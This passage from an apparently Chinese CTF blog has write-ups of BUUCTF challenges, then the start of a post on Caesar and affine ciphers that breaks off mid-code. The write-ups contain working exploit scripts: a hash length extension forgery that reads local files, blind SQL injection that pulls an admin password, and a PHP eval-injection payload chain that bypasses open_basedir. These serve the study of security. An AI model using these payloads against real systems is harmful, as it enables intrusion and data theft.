class=\"keyword\">if</span> (resp == <span class=\"string\">\"Connection Timeout\"</span>):</span><br><span class=\"line\">                    result[<span class=\"string\">'data'</span>] = resp</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">print</span> resp</span><br><span class=\"line\">                    tmpfile.write(resp)</span><br><span class=\"line\">                    tmpfile.close()</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = f.read()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result[<span class=\"string\">'code'</span>] == <span class=\"number\">500</span>:</span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = <span class=\"string\">\"Action Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">            result[<span class=\"string\">'msg'</span>] = <span class=\"string\">\"Sign Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkSign</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"comment\">#generate Sign For Action Scan.</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(\"/geneSign\", methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geneSign</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    action = <span class=\"string\">\"scan\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> getSign(action, param)</span><br><span class=\"line\"><span class=\"meta\">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    action = urllib.unquote(request.cookies.get(<span class=\"string\">\"action\"</span>))</span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    sign = urllib.unquote(request.cookies.get(<span class=\"string\">\"sign\"</span>))</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(waf(param)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"No Hacker!!!!\"</span></span><br><span class=\"line\">    task = Task(action, param, sign, ip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(task.Exec())</span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> open(<span class=\"string\">\"code.txt\"</span>,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    socket.setdefaulttimeout(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Connection Timeout\"</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSign</span><span class=\"params\">(action, param)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(content).hexdigest()</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    check=param.strip().lower()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check.startswith(<span class=\"string\">\"gopher\"</span>) <span class=\"keyword\">or</span> check.startswith(<span class=\"string\">\"file\"</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.debug = <span class=\"literal\">False</span></span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>\n<p>题目很明显是在考察哈希长度扩展攻击，但是在读文件的时候过滤了gopher和file协议，不过找到一篇<a href=\"http://13.58.107.157/archives/8936\" target=\"_blank\" rel=\"noopener\">文章(http://13.58.107.157/archives/8936)</a>说可以使用<code>local_file</code>协议，该协议是linux下支持的一个协议，也可以实现读文件<br><img src=\"/2020/09/14/buuctf1/5.png\" alt><br>流程如下：<br>先访问geneSign页面生成签名，这里要把我们的参数设定好，由于提示已经给出了flag位置，所以通过<code>local_file:flag.txt</code>即可读到flag<br>在生成签名之后，用hashpump生成即可<br><img src=\"/2020/09/14/buuctf1/6.png\" alt></p>\n<blockquote>\n<p>PS: <code>input sig</code> 填写我们获得的签名，<code>input data</code>填写之前生成签名的明文<strong>最后</strong>几位字符，<code>input key len</code>填写明文总长度减去input data长度后的值，最后填写我们要添加的值。</p>\n</blockquote>\n<p>将结果中的<code>\\x</code>替换为<code>%</code>后按照要求提交即可，exp如下(cookie要在headers中提交，否则会报错)：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> parse</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">'http://e78b915e-84fa-4293-a7eb-51e747ff6e43.node3.buuoj.cn/'</span></span><br><span class=\"line\">sig = requests.get(url+<span class=\"string\">'geneSign?param=local_file:flag.txt'</span>).content.decode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">print(sig)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 用hashpump生成替换值</span></span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">\"Cookie\"</span>: </span><br><span class=\"line\">    <span class=\"string\">r\"action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read; sign=a21ff75fdafd472a4e5abda397747fa0\"</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag = requests.get(url+<span class=\"string\">'De1ta?param=local_file:flag.txt'</span>,headers=headers).content.decode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">print(json.loads(flag)[<span class=\"string\">'data'</span>])</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"De1CTF-2019-Giftbox\"><a href=\"#De1CTF-2019-Giftbox\" class=\"headerlink\" title=\"[De1CTF 2019]Giftbox\"></a>[De1CTF 2019]Giftbox</h1><p>这题出的挺不错的，虽然整体考点并不难，但是却很考验综合能力，题目给出了源码（看了大佬wp才知道，原题是没有给源码的）<br>首先得说师傅这前端做的真是漂亮，佩服。题目给了一个模拟shell，可以执行简单的命令，简单<code>usage.md</code>可以看到一些主要命令，但是需要登录<br><img src=\"/2020/09/14/buuctf1/7.png\" alt><br>登录界面进行测试发现存在注入，没有任何过滤，不过由于输入空格会被当做命令分隔符，所以需要用注释符来绕过空格，查看浏览记录发现每次请求时需要输入totp值，查看js代码发现这是Google的一个一次性身份验证算法，查看<code>main.js</code>有一段注释信息，基本给出了totp算法的各项参数<br><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">[Developer Notes]</span></span><br><span class=\"line\"><span class=\"comment\">OTP Library for Python located in js/pyotp.zip</span></span><br><span class=\"line\"><span class=\"comment\">Server Params:</span></span><br><span class=\"line\"><span class=\"comment\">digits = 8</span></span><br><span class=\"line\"><span class=\"comment\">interval = 5</span></span><br><span class=\"line\"><span class=\"comment\">window = 1</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure><br>python下正好就有相应库，那么编写盲注脚本：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> pyotp</span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> parse</span><br><span class=\"line\"></span><br><span class=\"line\">sec = <span class=\"string\">'GAXG24JTMZXGKZBU'</span></span><br><span class=\"line\">totp = pyotp.TOTP(sec, digits=<span class=\"number\">8</span>, interval=<span class=\"number\">5</span>)</span><br><span class=\"line\">url = <span class=\"string\">'http://25835784-3899-453c-bc84-1e65288ad808.node3.buuoj.cn/shell.php'</span></span><br><span class=\"line\">password = <span class=\"string\">''</span></span><br><span class=\"line\">payload_pre = <span class=\"string\">\"?totp=&#123;&#125;&amp;a=\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, <span class=\"number\">60</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">34</span>, <span class=\"number\">127</span>):</span><br><span class=\"line\">        tmp = parse.quote(<span class=\"string\">\"login ad'/**/or/**/ascii(substr((select/**/password/**/from/**/users/**/where/**/username='admin'),&#123;&#125;,1))=&#123;&#125;# pa\"</span>.format(len(password)+<span class=\"number\">1</span>, j))</span><br><span class=\"line\">        res = requests.get(url+payload_pre.format(totp.now()) + tmp).content.decode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'password incorrect'</span> <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">            password += chr(j)</span><br><span class=\"line\">            print(password)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> j == <span class=\"number\">127</span>:</span><br><span class=\"line\">            print(<span class=\"string\">'finished.'</span>)</span><br><span class=\"line\">            exit()</span><br></pre></td></tr></table></figure><br>得到密码<code>hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</code>，密码中给出了命令提示<code>sh0w_hiiintttt_23333</code>，尝试运行一下<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[de1ta@de1ta-mbp &#x2F;sandbox]% sh0w_hiiintttt_23333</span><br><span class=\"line\">we add an evil monster named &#39;eval&#39; when launching missiles.</span><br></pre></td></tr></table></figure><br>那么基本就是命令执行了，登录之后，执行<code>targeting</code>命令设定参数，存在过滤<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkCode</span><span class=\"params\">($code)</span></span>&#123;</span><br><span class=\"line\">    $table=<span class=\"string\">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strlen($code)&gt;<span class=\"number\">2</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'code too long.'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ($i=<span class=\"number\">0</span>; $i&lt;strlen($code); $i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (strpos($table,$code[$i])===<span class=\"keyword\">FALSE</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">'bad code.'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists($sandbox.<span class=\"string\">'missiles/'</span>.md5($_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]).<span class=\"string\">'/'</span>.$code))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'target existed.'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkPosition</span><span class=\"params\">($position)</span></span>&#123;</span><br><span class=\"line\">    $table=<span class=\"string\">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#125;)$(&#123;_+-,.'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strlen($position)&gt;<span class=\"number\">12</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'position too long.'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ($i=<span class=\"number\">0</span>; $i&lt;strlen($position); $i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (strpos($table,$position[$i])===<span class=\"keyword\">FALSE</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">'bad position.'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>在设定参数之后，如<code>targeting a b</code>，后台会把我们的处理为<code>$a=&quot;b&quot;</code>，然后带入eval中执行，由于使用了双引号包裹变量导致了漏洞，因为在PHP中，双引号包裹的变量会被PHP尝试解析<a href=\"https://www.php.net/manual/zh/language.types.string.php#language.types.string.parsing\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/language.types.string.php#language.types.string.parsing</a>，利用此特性我们就可以进行函数执行，尝试执行phpinfo()，<code>targeting a ${phpinfo()}</code>，将返回页面保存到本地打开可以看到函数执行信息<br><img src=\"/2020/09/14/buuctf1/8.png\" alt><br><img src=\"/2020/09/14/buuctf1/9.png\" alt><br>可以看到题目设置了basedir，需要进行绕过，payload如下：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> parse</span><br><span class=\"line\"><span class=\"keyword\">import</span> pyotp</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">sec = <span class=\"string\">'GAXG24JTMZXGKZBU'</span></span><br><span class=\"line\">totp = pyotp.TOTP(sec, digits=<span class=\"number\">8</span>, interval=<span class=\"number\">5</span>)</span><br><span class=\"line\">session = requests.session()</span><br><span class=\"line\">base_url = <span class=\"string\">'http://25835784-3899-453c-bc84-1e65288ad808.node3.buuoj.cn/shell.php'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span><span class=\"params\">(sig)</span>:</span></span><br><span class=\"line\">    url = base_url + <span class=\"string\">'?a=&#123;&#125;&amp;totp=&#123;&#125;'</span></span><br><span class=\"line\">    payload = parse.quote(<span class=\"string\">'login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;'</span>)</span><br><span class=\"line\">    con = session.get(url.format(payload, sig)).text</span><br><span class=\"line\">    print(con)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">destruct</span><span class=\"params\">(sig)</span>:</span></span><br><span class=\"line\">    url = base_url + <span class=\"string\">'?a=&#123;&#125;&amp;totp=&#123;&#125;'</span></span><br><span class=\"line\">    payload = <span class=\"string\">'destruct'</span></span><br><span class=\"line\">    con = session.get(url.format(payload, sig)).text</span><br><span class=\"line\">    print(con)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">targeting</span><span class=\"params\">(sig, payload)</span>:</span></span><br><span class=\"line\">    url = base_url + <span class=\"string\">'?a=&#123;&#125;&amp;totp=&#123;&#125;'</span></span><br><span class=\"line\">    con = session.get(url.format(parse.quote(payload), sig)).text</span><br><span class=\"line\">    print(con)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">launch</span><span class=\"params\">(sig)</span>:</span></span><br><span class=\"line\">    url = base_url + <span class=\"string\">'?a=&#123;&#125;&amp;totp=&#123;&#125;'</span></span><br><span class=\"line\">    payload = <span class=\"string\">'launch'</span></span><br><span class=\"line\">    con = session.get(url.format(payload, sig)).text</span><br><span class=\"line\">    flag =  re.findall(<span class=\"string\">r'(flag\\&#123;[a-z0-9\\-]+\\&#125;)'</span>,con)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> flag:</span><br><span class=\"line\">        print(flag[<span class=\"number\">0</span>])</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        print(con)</span><br><span class=\"line\">login(totp.now())</span><br><span class=\"line\">destruct(totp.now())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># phpinfo()</span></span><br><span class=\"line\"><span class=\"comment\"># payloads = ['targeting a $&#123;phpinfo()&#125;']</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># scandir('/')</span></span><br><span class=\"line\"><span class=\"comment\"># payloads = ['targeting a chdir','targeting b img','targeting c &#123;$a($b)&#125;','targeting d ini_set','targeting e open_basedir',</span></span><br><span class=\"line\"><span class=\"comment\">#    'targeting f ..','targeting g &#123;$d($e,$f)&#125;','targeting h &#123;$a($f)&#125;','targeting i &#123;$a($f)&#125;','targeting j chr',</span></span><br><span class=\"line\"><span class=\"comment\">#    'targeting k &#123;$j(47)&#125;','targeting l &#123;$d($e,$k)&#125;','targeting m scandir','targeting n print_r','targeting o &#123;$n($m($k))&#125;']</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># file_get_contents('/flag')</span></span><br><span class=\"line\">payloads = [<span class=\"string\">'targeting a chdir'</span>,<span class=\"string\">'targeting b img'</span>,<span class=\"string\">'targeting c &#123;$a($b)&#125;'</span>,<span class=\"string\">'targeting d ini_set'</span>,<span class=\"string\">'targeting e open_basedir'</span>,</span><br><span class=\"line\">    <span class=\"string\">'targeting f ..'</span>,<span class=\"string\">'targeting g &#123;$d($e,$f)&#125;'</span>,<span class=\"string\">'targeting h &#123;$a($f)&#125;'</span>,<span class=\"string\">'targeting i &#123;$a($f)&#125;'</span>,<span class=\"string\">'targeting j chr'</span>,</span><br><span class=\"line\">    <span class=\"string\">'targeting k &#123;$j(47)&#125;'</span>,<span class=\"string\">'targeting l &#123;$d($e,$k)&#125;'</span>,<span class=\"string\">'targeting m flag'</span>,<span class=\"string\">'targeting n $k$m'</span>,<span class=\"string\">'targeting o file_get_'</span>,</span><br><span class=\"line\">    <span class=\"string\">'targeting p contents'</span>,<span class=\"string\">'targeting q $o$p'</span>,<span class=\"string\">'targeting r &#123;$q($n)&#125;'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> each <span class=\"keyword\">in</span> payloads:</span><br><span class=\"line\">    targeting(totp.now(), each)</span><br><span class=\"line\">launch(totp.now())</span><br></pre></td></tr></table></figure></p>\n","categories":["复现"],"tags":["CTF","Web"]},{"title":"密码学作业记录（一）","url":"/2019/01/15/crypto1/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近在学习密码学，研究了一些密码学算法，特此记录一下。</p>\n<a id=\"more\"></a>\n<h1 id=\"古典密码\"><a href=\"#古典密码\" class=\"headerlink\" title=\"古典密码\"></a>古典密码</h1><p>古典密码体制是基于古代落后的计算条件和落后的密码学与数学知识建立的，本部分选取了<strong>凯撒密码</strong>和<strong>仿射密码</strong>。</p>\n<h2 id=\"凯撒密码\"><a href=\"#凯撒密码\" class=\"headerlink\" title=\"凯撒密码\"></a>凯撒密码</h2><p>凯撒密码本质上是一种置换密码，且为一对一的置换加密方式。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例如，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推。这个加密方法是以罗马共和时期恺撒的名字命名的，当年恺撒曾用此方法与其将军们进行联系。</p>\n<p><em>代码如下</em></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 名密文输入范围是26个英文小写字母</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">mode = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"string\">\"encrypt\"</span>:</span><br><span class=\"line\">\tplain = raw_input(<span class=\"string\">\"Please input plaintext: \"</span>)</span><br><span class=\"line\">\tkey = input(<span class=\"string\">\"Please input key: \"</span>)</span><br><span class=\"line\">\tcip = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(plain)):</span><br><span class=\"line\">\t\ttemp = (ord(plain[i]) - ord(<span class=\"string\">'a'</span>) + key) % <span class=\"number\">26</span> + ord(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">\t\tcip += chr(temp)</span><br><span class=\"line\">\tprint(<span class=\"string\">\"cipher: \"</span> + cip)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">elif</span> mode == <span class=\"string\">\"decrypt\"</span>:</span><br><span class=\"line\">\tcipher = raw_input(<span class=\"string\">\"Please input cipher: \"</span>)</span><br><span class=\"line\">\tkey = input(<span class=\"string\">\"Please input key: \"</span>)</span><br><span class=\"line\">\tpla = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(cipher)):</span><br><span class=\"line\">\t\ttemp = (ord(cipher[i])-ord(<span class=\"string\">\"a\"</span>) - key) % <span class=\"number\">26</span> + ord(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">\t\tpla += chr(temp)</span><br><span class=\"line\">\tprint(<span class=\"string\">\"plaintext: \"</span> + pla)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">\tprint(sys.argv[<span class=\"number\">1</span>],<span class=\"string\">\" is not supported:(\"</span>)</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2019/01/15/crypto1/1.png\" alt=\"demo\"></p>\n<blockquote>\n<p>安全性分析：可以看到，凯撒密码的加解密方式简单，手工即可实现，在古代落后的计算能力之下，该中算法拥有着很高的安全性，但是放在现在由于计算能力的提高，该算法表现出脆弱性，无法抵抗穷举攻击，因为对于一串明文，可能的加密组合只有26种，以现在的计算手段，对于任何攻击方式都表现出极大的脆弱性，当遭受<strong>已知明文攻击</strong>时完全没有抵抗性，故而现代密码体制中已不再采用该密码。</p>\n</blockquote>\n<h2 id=\"仿射密码\"><a href=\"#仿射密码\" class=\"headerlink\" title=\"仿射密码\"></a>仿射密码</h2><p>仿射密码的加密算法就是一个线性变换，及对任意的明文字符x，对应的密文字符为 <code>y≡e(x)≡ax+b(mod 26)</code>，其中a,b均为26以内的正整数，并且要求<code>gcd(a,26)=1</code>，函数e(x)称为仿射加密函数，解密时用<code>x≡d(e(x))≡a&#39;(e(x)-b)(mod 26)</code>来解密。</p>\n<p><em>代码如下：</em></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_re</span><span class=\"params\">(a)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">27</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> i*a % <span class=\"number\">26</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> i</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ex = ax+b</span></span><br><span class=\"line\">mode = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"string\">\"e\"</span>:</span><br><span class=\"line\">\tp = str(input(<span class=\"string\">\"Plz input plain: \"</span>))</span><br><span class=\"line\">\ta = int(input(<span class=\"string\">\"Plz input a: \"</span>))</span><br><span class=\"line\">\tb = int(input(<span class=\"string\">\"Plz input b: \"</span>))</span><br><span class=\"line\">\tc = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(p)):</span><br><span class=\"line\">\t\tt = ((ord(p[i]) - ord(<span class=\"string\">'a'</span>)) * a + b) % <span class=\"number\">26</span> + ord(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">\t\tc += chr(t)</span><br><span class=\"line\">\tprint(<span class=\"string\">\"cipher: \"</span> + c)</span><br><span class=\"line\"><span class=\"keyword\">elif</span> mode == <span class=\"string\">\"d\"</span>:</span><br><span class=\"line\">\t<span class=\"comment\"># a'(e(x)-b)</span></span><br><span class=\"line\">\tc = str(input(<span class=\"string\">\"Plz input cipher: \"</span>))</span><br><span class=\"line\">\ta = int(input(<span class=\"string\">\"Plz input a: \"</span>))</span><br><span class=\"line\">\tb = int(input(<span class=\"string\">\"Plz input b: \"</span>))</span><br><span class=\"line\">\tp = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t_a = get_re(a)</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(c)): </span><br><span class=\"line\">\t\tt = (ord(c[i]) - ord(<span class=\"string\">'a'</span>) - b)*_a % <span class=\"number\">26</span> + ord(<span class=\"string\">'a'</span>)</span><br><span class=\"line\">\t\tp += chr(t)</span><br><span class=\"line\">\tprint(<span class=\"string\">\"plain: \"</span> + p)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">\tprint(<span class=\"string\">\"Input Error:(\"</span>)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>加密时按照加密公式给出，解密时用穷举法求出a的逆元从而解密。</p>\n</blockquote>\n<p><em>实例演示</em></p>\n<p><img src=\"/2019/01/15/crypto1/2.png\" alt=\"demo\"></p>\n<hr>\n<p>　　可以看到，仿射加密和凯撒加密本质都是一种一对一的加密方式，这种加密方式没有将字母出现的统计规律隐藏起来，在英文中对于足够长的英文文本来说，字符的出现频率是相对固定的，还有字母的有些组合出现频率也是相对固定的，这样就可以通过统计分析法来破解上述加密方式加密出来的密文。</p>\n<p><em>频率分析法破解仿射密码</em></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">假如我们已知一串密文 fmxvedkaphferbndkrxrsrefmorudsdkdvshvufedkaprkdlyevlrhhrh，</span><br><span class=\"line\">此时可以通过频率分析法尝试爆破出明文</span><br></pre></td></tr></table></figure>\n<p><em>代码如下</em></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">dic = [<span class=\"string\">'e'</span>,<span class=\"string\">'t'</span>,<span class=\"string\">'a'</span>,<span class=\"string\">'o'</span>,<span class=\"string\">'i'</span>,<span class=\"string\">'n'</span>,<span class=\"string\">'s'</span>,<span class=\"string\">'h'</span>,<span class=\"string\">'r'</span>,<span class=\"string\">'d'</span>,<span class=\"string\">'l'</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'u'</span>,<span class=\"string\">'m'</span>,<span class=\"string\">'w'</span>,<span class=\"string\">'f'</span>,<span class=\"string\">'g'</span>,<span class=\"string\">'y'</span>,<span class=\"string\">'p'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'v'</span>,<span class=\"string\">'k'</span>,<span class=\"string\">'j'</span>,<span class=\"string\">'x'</span>,<span class=\"string\">'q'</span>,<span class=\"string\">'z'</span>]</span><br><span class=\"line\">freq = [<span class=\"number\">0</span>] * <span class=\"number\">26</span></span><br><span class=\"line\">cipher = input(<span 